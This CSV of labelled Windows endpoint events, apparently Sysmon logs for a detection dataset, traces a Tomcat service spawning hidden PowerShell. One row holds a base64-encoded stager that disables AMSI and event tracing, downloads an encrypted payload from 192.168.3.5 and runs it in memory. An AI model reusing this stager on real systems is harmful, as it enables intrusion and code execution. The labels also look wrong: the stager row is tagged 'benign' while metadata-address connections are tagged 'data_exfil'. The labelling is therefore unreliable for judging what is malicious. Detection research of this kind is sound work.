timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:05.1230000Z,3,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,tcp,192.168.2.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:05.1350000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,tcp,169.254.169.254,NT AUTHORITY\SYSTEM,2,data_exfil,data_exfil
2022-05-13T08:54:06.4580000Z,12,C:\Windows\system32\svchost.exe,,,3012,HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4890000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4930000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5030000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5080000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.6900000Z,11,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,C:\ProgramData\Tomcat9\logs\vulnapp-2.14.0.log,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4420000Z,22,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:05.7740000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,tcp,169.254.169.254,NT AUTHORITY\SYSTEM,2,data_exfil,data_exfil
2022-05-13T08:54:06.9230000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.0030000Z,12,C:\Windows\system32\svchost.exe,,,3608,HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\PushNotifications\Backup,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4510000Z,26,C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe,,,7716,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4560000Z,11,C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe,,,7716,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4860000Z,5,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.5060000Z,5,C:\Windows\System32\conhost.exe,,,11924,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4200000Z,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAHcAQQB1AEEARABVAEEATwBnAEEAMABBAEQAUQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBYAGYAUwBWAEIAOwBbAEkASwAzAGUALQBnAHQAagBUACMAXgB6AEwANABEAF8APABFAC8ALgB2AHIAbwA9AE8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGwAWAB4AGMAQgBkAD0AdgBxAHcAdQBpAG8AagBTAC8AUQBjAGUAaQBMAE4AZABIAFcAdABaAGcAeQBWACsARABwAFkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4210000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.4210000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5110000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5130000Z,1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.7860000Z,3,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,tcp,192.168.3.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5110000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5160000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5260000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5260000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5260000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5360000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5360000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5360000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5510000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5510000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5610000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6710000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7070000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7070000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7470000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7470000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.7470000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.7310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7360000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7560000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7610000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9110000Z,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_5f34qx4d.0qx.ps1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9110000Z,11,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\__PSScriptPolicyTest_i1jtgrrb.hiw.psm1,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\CA\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\CA\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
